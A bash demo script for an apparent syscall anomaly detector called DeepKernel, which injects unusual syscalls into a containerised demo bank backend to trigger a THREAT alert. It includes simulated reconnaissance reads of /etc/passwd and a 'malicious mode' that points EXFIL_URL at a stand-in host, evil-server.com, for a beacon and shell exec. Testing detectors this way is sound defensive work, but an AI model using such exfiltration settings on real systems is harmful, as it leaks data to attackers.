#!/usr/bin/env bash
#
# DeepKernel Demo: Trigger THREAT Scenario
#
# This script injects FOREIGN syscalls that the ML model has never seen:
# - execve, fork, clone (process creation)
# - mmap, mprotect (memory operations)
# - connect to random high ports (data exfiltration pattern)
# - file reads on /etc/passwd, /proc/* (reconnaissance)
#
# These syscalls are NOT in the training data, so the anomaly score will skyrocket!
#
# Usage: ./scripts/demo-threat.sh [--duration 30] [--intensity high]
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPOSE_DIR="$(dirname "$SCRIPT_DIR")"
DURATION="${1:-30}"
INTENSITY="${2:-high}"

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║          DeepKernel Demo: THREAT Scenario                      ║"
echo "║                                                                ║"
echo "║  Injecting FOREIGN syscalls to trigger anomaly detection:     ║"
echo "║  - execve, fork, clone (process creation)                     ║"
echo "║  - mmap, mprotect (memory allocation)                         ║"
echo "║  - connect to random ports (exfiltration pattern)             ║"
echo "║  - openat on /etc/passwd, /proc/* (reconnaissance)            ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

CONTAINER_NAME="bachat-bank_backend_1"

# Check if container is running
if ! docker ps --format '{{.Names}}' | grep -q "$CONTAINER_NAME"; then
    echo "Container $CONTAINER_NAME not running. Starting..."
    docker-compose -f "$COMPOSE_DIR/docker-compose.yml" up -d backend
    sleep 3
fi

echo "Step 1: Copying anomaly injector into container..."
docker cp "$SCRIPT_DIR/inject-anomaly.py" "$CONTAINER_NAME:/tmp/inject-anomaly.py"

echo ""
echo "Step 2: Running anomaly injection (duration=${DURATION}s, intensity=${INTENSITY})..."
echo "        This will generate syscalls FOREIGN to the trained model!"
echo ""

# Run the anomaly injector inside the container
docker exec -it "$CONTAINER_NAME" python3 /tmp/inject-anomaly.py \
    --duration "$DURATION" \
    --intensity "$INTENSITY" \
    --type all

echo ""
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║   Anomaly injection complete!                                  ║"
echo "║                                                                ║"
echo "║  What was injected (NOT in training data):                    ║"
echo "║  - execve, fork, clone: 0% in training -> now flooding        ║"
echo "║  - mmap, mprotect: 0% in training -> now flooding             ║"
echo "║  - connect to ports 4000-9000: foreign pattern                ║"
echo "║  - openat /etc/passwd, /proc/*: reconnaissance                ║"
echo "║                                                                ║"
echo "║  Expected result:                                              ║"
echo "║  - Anomaly score should drop to < -0.8 (very anomalous)       ║"
echo "║  - ML model flags as THREAT                                    ║"
echo "║  - Triage confirms THREAT verdict                              ║"
echo "║                                                                ║"
echo "║  Check: http://<server>:9090                                  ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

# Also trigger the built-in malicious mode
echo "Step 3: Also activating built-in malicious mode (beacon + shell exec)..."
export MODE=malicious
export EXFIL_URL="https://evil-server.com:4444/steal"
docker-compose -f "$COMPOSE_DIR/docker-compose.yml" up -d --build backend 2>/dev/null || true

echo ""
echo "Backend logs:"
docker-compose -f "$COMPOSE_DIR/docker-compose.yml" logs --tail=10 backend

